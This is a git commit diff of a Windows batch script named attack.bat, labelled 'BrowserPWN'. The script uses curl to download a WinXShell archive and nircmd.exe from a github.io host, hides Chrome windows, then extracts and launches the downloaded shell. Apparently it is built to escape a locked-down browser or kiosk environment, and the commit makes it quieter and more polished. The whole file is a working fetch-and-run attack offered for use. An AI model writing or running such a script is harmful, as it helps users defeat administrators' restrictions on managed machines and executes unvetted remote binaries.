2d0cbeb37a78038dc8314b2b533c3214bf5fefef
bfffggh <83696427+bfffggh@users.noreply.github.com>
2024-01-23 20:20:51 +0100

    Update attack.bat

--- attack.bat
+++ attack.bat
@@ -1,7 +1,12 @@
 @echo off
+title BrowserPWN
+color 1f
+echo ======== [BrowserPWN] ========
 cd /d "%userprofile%"
-curl https://bfffggh.github.io/bp1/WinXShell_x64.7z -o wx.7z
-curl https://bfffggh.github.io/bp1/nircmd.exe -o nc.exe
+echo Downloading WinXShell...
+curl https://bfffggh.github.io/bp1/WinXShell_x64.7z -o wx.7z >NUL
+echo Initializing session...
+curl https://bfffggh.github.io/bp1/nircmd.exe -o nc.exe >NUL
 nc win hide class Chrome_WidgetWin_1
-"%ProgramFiles%\7-zip\7z.exe" x wx.7z -owx
-start "" wx\winxshell.exe
+"%ProgramFiles%\7-zip\7z.exe" x wx.7z -owx >NUL
+start "" wx\winxshell\winxshell.exe
